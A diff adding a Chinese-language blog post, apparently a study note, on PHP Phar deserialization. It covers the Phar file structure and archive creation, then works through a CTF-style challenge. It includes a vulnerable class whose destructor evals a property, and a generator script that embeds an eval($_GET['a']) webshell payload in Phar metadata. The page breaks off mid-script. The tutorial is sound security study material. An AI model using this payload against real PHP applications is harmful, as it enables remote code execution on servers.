@@ -1,0 +1,897 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tubiao.png">
+  <link rel="icon" href="/img/tubiao.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="chen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="什么是PharJAR 是开发 Java 程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个 JAR 文件里，使得部署过程十分简单 phar是 PHP 里类似于 JAR 的一种打包文件，说白了其本质可以理解为一个压缩包 对于 PHP 5.3 或更高版本，phar后缀文件时默认开启支持的，可以直接使用 一般使用文件包含中的**phar伪协议进行读取.phar文件** Phar文件结构 **s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phar反序列化">
+<meta property="og:url" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="(๑´ڡ&#96;๑)">
+<meta property="og:description" content="什么是PharJAR 是开发 Java 程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个 JAR 文件里，使得部署过程十分简单 phar是 PHP 里类似于 JAR 的一种打包文件，说白了其本质可以理解为一个压缩包 对于 PHP 5.3 或更高版本，phar后缀文件时默认开启支持的，可以直接使用 一般使用文件包含中的**phar伪协议进行读取.phar文件** Phar文件结构 **s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420202950641.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420203104476.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175359494.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175611356.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175706263.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421181801644.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184245937.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184338480.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421183120702.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184732520.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191301040.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421185913907.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421190111156.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191439247.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421192916940.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194052111.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194809962.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421195235055.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200406776.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200456451.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200642878.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201143536.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201248601.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421205949427.png">
+<meta property="article:published_time" content="2025-04-25T06:32:50.000Z">
+<meta property="article:modified_time" content="2025-04-25T07:09:59.771Z">
+<meta property="article:author" content="chen">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420202950641.png">
+<meta name="twitter:creator" content="@chen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Phar反序列化 - (๑´ڡ`๑)</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>小晨的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Phar反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        chen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-25 14:32" pubdate>
+          2025年4月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Phar反序列化</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-04-25T15:09:59+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是<code>Phar</code></h1><p>JAR 是开发 Java 程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个 JAR 文件里，使得部署过程十分简单</p>
+<p><code>phar</code>是 PHP 里类似于 JAR 的一种打包文件，说白了其本质可以理解为一个压缩包</p>
+<p>对于 PHP 5.3 或更高版本，<code>phar</code>后缀文件时默认开启支持的，可以直接使用</p>
+<p>一般使用文件包含中的**<code>phar</code>伪协议<strong>进行读取</strong><code>.phar</code>文件**</p>
+<h1 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a><code>Phar</code>文件结构</h1><ul>
+<li>**<code>stub phar：</code>**这是<code>phar</code>文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>（头部信息），这是 PHAR 文件的入口点，当 PHP 解释器加载 PHAR 文件时，会首先执行 Stub 代码</li>
+<li><strong><code>manifest：</code><strong>压缩文件的属性等信息，以</strong>序列化</strong>方式存储</li>
+<li>**<code>contents：</code>**压缩文件的内容</li>
+<li>**<code>signature：</code>**签名，放在文件末尾</li>
+</ul>
+<p><strong><code>phar</code>协议</strong>解析文件时，会自动触发对**<code>manifest</code>字段<strong>的</strong>序列化字符串<strong>进行</strong>反序列化**</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420202950641.png" srcset="/img/loading.gif" lazyload alt="image-20250420202950641"></p>
+<p>以下是官方文档，红框部分是要进行利用的序列化部分</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420203104476.png" srcset="/img/loading.gif" lazyload alt="image-20250420203104476"></p>
+<p><strong><code>phar</code>文件的压缩和解压缩</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;test2.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">buildfromDirectory</span>(<span class="hljs-string">&#x27;f:\0Day&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setDefaultStub</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>Phar</code>类：</strong><code>Phar</code>是 PHP 内置的一个类，用于创建、操作和管理 PHAR 文件</li>
+<li>**<code>$phar = new Phar(&#39;test2.phar&#39;,0,&#39;test2.phar&#39;);</code>**第一个参数<code>test2.phar</code>是创建的 PHAR 文件名，如果文件不存在会创建一个新的文件，如果文件存在并允许进行修改，会对其进行更新；第二个参数<code>0</code>表示文件创建的标志，实际应用中会使用如：<code>Phar::CREATE</code>表示创建新的 PHAR 文件，来指定不同的创建模式；第三个参数<code>test2.phar</code>指定 PHAR 文件的别名，可以在后续中引用该 PHAR 文件时使用</li>
+<li>**<code>$phar-&gt;buildfromDirectory(&#39;f:\0Day&#39;);</code>**指定要打包的目录路径</li>
+<li>**<code>$phar-&gt;setDefaultStub(&#39;test.txt&#39;,&#39;test.txt&#39;);</code>**中<code>setDefaultStub</code>用于为 PHAR 文件设置默认的 Stub，即默认入口；第一个参数<code>test.txt</code>是入口文件的路径，第二个参数 <code>&#39;test.txt&#39;</code> 是内部文件的路径</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 解压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>$phar = new Phar(&#39;test.phar&#39;);</code>**通过 <code>new Phar(&#39;test.phar&#39;)</code> 语句，程序尝试打开名为 <code>test.phar</code> 的 Phar 压缩包文件，并将其封装成一个 <code>Phar</code> 对象存储在变量 <code>$phar</code> 中。如果 <code>test.phar</code> 文件不存在，会报错</li>
+<li>**<code>$phar-&gt;extractTo(&#39;test&#39;);</code>**调用 <code>Phar</code> 对象的 <code>extractTo</code> 方法，该方法的作用是将 Phar 压缩包中的所有内容提取到指定的目录；参数 <code>&#39;test&#39;</code> 是目标目录，即 Phar 压缩包中的文件和目录会被解压到名为 <code>test</code> 的目录下。如果该目录不存在，PHP 会尝试创建它；若已存在，则会将文件解压到该目录内</li>
+</ul>
+<h2 id="创建一个-phar文件的模板"><a href="#创建一个-phar文件的模板" class="headerlink" title="创建一个.phar文件的模板"></a>创建一个<code>.phar</code>文件的模板</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>具体解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># 要写入文件中的部分</span><br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Phar反序列化漏洞原理"><a href="#Phar反序列化漏洞原理" class="headerlink" title="Phar反序列化漏洞原理"></a><code>Phar</code>反序列化漏洞原理</h1><p><code>manifest</code>压缩文件的属性等信息，以序列化存储，存在一段序列化的字符串</p>
+<p>调用<code>phar</code>伪协议，可读取<code>.phar</code>文件</p>
+<p><code>phar</code>协议解析文件时，会自动触发对<code>manifest</code>字段的序列化字符串进行反序列化</p>
+<p><code>phar</code>需要满足 PHP &gt;&#x3D; 5.2，在<code>php.ini</code>中将<code>phar.readonly</code>设为<code>Off</code></p>
+<p>以下是这个漏洞受到影响的函数（即可以使用<code>phar</code>伪协议读取<code>.phar</code>文件的函数）</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175359494.png" srcset="/img/loading.gif" lazyload alt="image-20250421175359494"></p>
+<h3 id="具体题目解析"><a href="#具体题目解析" class="headerlink" title="具体题目解析"></a>具体题目解析</h3><p>第一个是漏洞页面<code>index.php</code>，源码如下</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175611356.png" srcset="/img/loading.gif" lazyload alt="image-20250421175611356"></p>
+<p>第二个是可以生成<code>phar</code>文件的页面<code>phar.php</code>，源码如下</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175706263.png" srcset="/img/loading.gif" lazyload alt="image-20250421175706263"></p>
+<p><strong>审计代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&quot;echo &#x27;ok&#x27;;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;output);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>在漏洞页面<code>index.php</code>的源码中，定义了<code>Testobj</code>这个类，有一个属性<code>output</code>，和一个<code>__destruct()</code>魔术方法，会执行<code>output</code>的内容，这里可以进行RCE执行命令</li>
+<li>然后是可以GET传参<code>filename</code>，并且使用了<code>file_exists()</code>函数检查文件或目录是否存在，这个函数存在与受影响的函数之中，所以这里存在<code>phar</code>反序列化漏洞</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 